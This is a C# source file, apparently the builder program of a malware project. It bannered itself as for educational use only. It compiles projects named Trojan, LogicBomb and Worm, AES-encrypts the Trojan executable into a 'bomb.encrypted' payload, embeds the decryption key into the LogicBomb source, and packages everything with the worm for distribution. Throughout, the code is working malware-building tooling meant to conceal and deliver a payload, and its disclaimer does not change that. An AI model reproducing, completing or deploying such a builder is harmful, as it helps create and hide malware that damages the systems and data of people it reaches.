using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Builder
{
    class Program
    {
        private static string SolutionDir;
        private static string BuilderOutputDir;
        private static string PayloadDir;

        private static byte[] AesKey;
        private static byte[] AesIV;

        static void Main(string[] args)
        {
            Console.WriteLine("===========================================");
            Console.WriteLine("   MALWARE BUILDER - EDUCATIONAL USE ONLY");
            Console.WriteLine("===========================================");
            Console.WriteLine();

            try
            {
                // Initialize paths
                InitializePaths();

                // Step 1: Generate AES key and IV
                GenerateEncryptionKeys();

                // Step 2: Build Trojan
                BuildProject("Trojan");

                // Step 3: Encrypt Trojan.exe
                EncryptTrojan();

                // Step 4: Update LogicBomb template with encryption keys
                UpdateLogicBombTemplate();

                // Step 5: Build LogicBomb
                BuildProject("LogicBomb");

                // Step 6: Build Worm
                BuildProject("Worm");

                // Step 7: Create output structure
                CreateOutputStructure();

                // Step 8: Cleanup
                CleanupIntermediateFiles();

                Console.WriteLine();
                LogSuccess("Build completed successfully!");
                Console.WriteLine();
                LogInfo($"Output location: {BuilderOutputDir}");
                LogInfo("Structure:");
                LogInfo($"  product/");
                LogInfo($"    - Worm.exe");
                LogInfo($"    - payload/");
                LogInfo($"        - LogicBomb.exe");
                LogInfo($"        - bomb.encrypted");
            }
            catch (Exception ex)
            {
                Console.WriteLine();
                LogError("BUILD FAILED!");
                LogError($"Error: {ex.Message}");
                Console.WriteLine();
                LogError("Stack trace:");
                Console.WriteLine(ex.StackTrace);
                Environment.Exit(1);
            }

            Console.WriteLine();
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
        }

        private static void InitializePaths()
        {
            LogInfo("Initializing paths...");

            // Get solution directory (Builder's parent directory)
            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
            SolutionDir = Directory.GetParent(currentDir).Parent.Parent.Parent.FullName;

            // Create product folder for clean output
            BuilderOutputDir = Path.Combine(currentDir, "product");
            PayloadDir = Path.Combine(BuilderOutputDir, "payload");

            // Create directories
            Directory.CreateDirectory(BuilderOutputDir);
            Directory.CreateDirectory(PayloadDir);

            LogSuccess($"Solution directory: {SolutionDir}");
            LogSuccess($"Output directory: {BuilderOutputDir}");
            Console.WriteLine();
        }

        private static void GenerateEncryptionKeys()
        {
            LogInfo("Generating AES-256 encryption key and IV...");

            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.GenerateKey();
                aes.GenerateIV();

                AesKey = aes.Key;
                AesIV = aes.IV;
            }

            LogSuccess($"Generated AES Key: {BitConverter.ToString(AesKey).Replace("-", "")}");
            LogSuccess($"Generated AES IV: {BitConverter.ToString(AesIV).Replace("-", "")}");
            Console.WriteLine();
        }

        private static void BuildProject(string projectName)
        {
            LogInfo($"Building {projectName} project...");

            string projectPath = Path.Combine(SolutionDir, projectName, $"{projectName}.csproj");

            if (!File.Exists(projectPath))
            {
                throw new FileNotFoundException($"Project file not found: {projectPath}");
            }

            // Use MSBuild or dotnet build
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "dotnet",
                Arguments = $"build \"{projectPath}\" --configuration Debug",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (process.ExitCode != 0)
                {
                    Console.WriteLine(output);
                    Console.WriteLine(error);
                    throw new Exception($"Failed to build {projectName}. Exit code: {process.ExitCode}");
                }
            }

            LogSuccess($"{projectName} built successfully");
            Console.WriteLine();
        }

        private static void EncryptTrojan()
        {
            LogInfo("Encrypting Trojan.exe...");

            string trojanExePath = Path.Combine(SolutionDir, "Trojan", "bin", "Debug", "Trojan.exe");

            if (!File.Exists(trojanExePath))
            {
                // Try looking for .NET Core output
                trojanExePath = Path.Combine(SolutionDir, "Trojan", "bin", "Debug", "net472", "Trojan.exe");
                if (!File.Exists(trojanExePath))
                {
                    trojanExePath = Path.Combine(SolutionDir, "Trojan", "bin", "Debug", "net48", "Trojan.exe");
                    if (!File.Exists(trojanExePath))
                    {
                        throw new FileNotFoundException($"Trojan.exe not found in expected build output locations");
                    }
                }
            }

            LogInfo($"Found Trojan.exe at: {trojanExePath}");

            // Create payload directory if it doesn't exist
            Directory.CreateDirectory(PayloadDir);

            string encryptedOutputPath = Path.Combine(PayloadDir, "bomb.encrypted");

            // Encrypt the file
            using (Aes aes = Aes.Create())
            {
                aes.Key = AesKey;
                aes.IV = AesIV;

                using (FileStream fsInput = new FileStream(trojanExePath, FileMode.Open, FileAccess.Read))
                using (FileStream fsOutput = new FileStream(encryptedOutputPath, FileMode.Create, FileAccess.Write))
                using (CryptoStream cs = new CryptoStream(fsOutput, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    fsInput.CopyTo(cs);
                }
            }

            FileInfo originalFile = new FileInfo(trojanExePath);
            FileInfo encryptedFile = new FileInfo(encryptedOutputPath);

            LogSuccess($"Trojan.exe encrypted successfully");
            LogSuccess($"Original size: {originalFile.Length} bytes");
            LogSuccess($"Encrypted size: {encryptedFile.Length} bytes");
            LogSuccess($"Output: {encryptedOutputPath}");
            Console.WriteLine();
        }

        private static void UpdateLogicBombTemplate()
        {
            LogInfo("Updating LogicBomb template with encryption keys...");

            string templatePath = Path.Combine(SolutionDir, "LogicBomb", "ProgramTemplate.cs");
            string programPath = Path.Combine(SolutionDir, "LogicBomb", "Program.cs");

            if (!File.Exists(templatePath))
            {
                throw new FileNotFoundException($"Template file not found: {templatePath}");
            }

            // Read template
            string templateContent = File.ReadAllText(templatePath);

            // Generate byte array strings
            string keyArrayString = string.Join(", ", AesKey.Select(b => $"0x{b:X2}"));
            string ivArrayString = string.Join(", ", AesIV.Select(b => $"0x{b:X2}"));

            // Replace placeholders
            string updatedContent = templateContent.Replace("/*{{AES_KEY}}*/", keyArrayString);
            updatedContent = updatedContent.Replace("/*{{AES_IV}}*/", ivArrayString);

            // Write to Program.cs
            File.WriteAllText(programPath, updatedContent);

            LogSuccess("LogicBomb template updated successfully");
            LogSuccess($"Embedded AES key and IV into: {programPath}");
            Console.WriteLine();
        }

        private static void CreateOutputStructure()
        {
            LogInfo("Creating output structure in 'product' folder...");

            // Directories already created in InitializePaths()

            // Copy Worm.exe
            string wormSource = FindExecutable("Worm", "Worm.exe");
            string wormDest = Path.Combine(BuilderOutputDir, "Worm.exe");
            File.Copy(wormSource, wormDest, true);
            LogSuccess($"Copied Worm.exe to product folder");

            // Copy LogicBomb.exe
            string logicBombSource = FindExecutable("LogicBomb", "LogicBomb.exe");
            string logicBombDest = Path.Combine(PayloadDir, "LogicBomb.exe");
            File.Copy(logicBombSource, logicBombDest, true);
            LogSuccess($"Copied LogicBomb.exe to product/payload folder");

            // bomb.encrypted is already in payload folder from EncryptTrojan()
            LogSuccess("bomb.encrypted already in product/payload folder");

            Console.WriteLine();
        }

        private static string FindExecutable(string projectName, string exeName)
        {
            string[] possiblePaths = new[]
            {
                Path.Combine(SolutionDir, projectName, "bin", "Debug", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net472", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net48", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net6.0", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net7.0", exeName),
                Path.Combine(SolutionDir, projectName, "bin", "Debug", "net8.0", exeName)
            };

            foreach (string path in possiblePaths)
            {
                if (File.Exists(path))
                {
                    return path;
                }
            }

            throw new FileNotFoundException($"{exeName} not found in any expected location for project {projectName}");
        }

        private static void CleanupIntermediateFiles()
        {
            LogInfo("Cleaning up intermediate files...");

            try
            {
                // Delete build outputs from Worm, LogicBomb, and Trojan bin folders
                string[] projectsToClean = { "Worm", "LogicBomb", "Trojan" };

                foreach (string project in projectsToClean)
                {
                    string binPath = Path.Combine(SolutionDir, project, "bin");
                    if (Directory.Exists(binPath))
                    {
                        Directory.Delete(binPath, true);
                        LogSuccess($"Cleaned {project}/bin folder");
                    }

                    string objPath = Path.Combine(SolutionDir, project, "obj");
                    if (Directory.Exists(objPath))
                    {
                        Directory.Delete(objPath, true);
                        LogSuccess($"Cleaned {project}/obj folder");
                    }
                }

                Console.WriteLine();
            }
            catch (Exception ex)
            {
                LogWarning($"Cleanup warning: {ex.Message}");
                LogWarning("Some files may still be in use. This is non-critical.");
                Console.WriteLine();
            }
        }

        // Logging helpers
        private static void LogInfo(string message)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("[INFO] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogSuccess(string message)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[SUCCESS] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogWarning(string message)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("[WARNING] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }

        private static void LogError(string message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("[ERROR] ");
            Console.ResetColor();
            Console.WriteLine(message);
        }
    }
}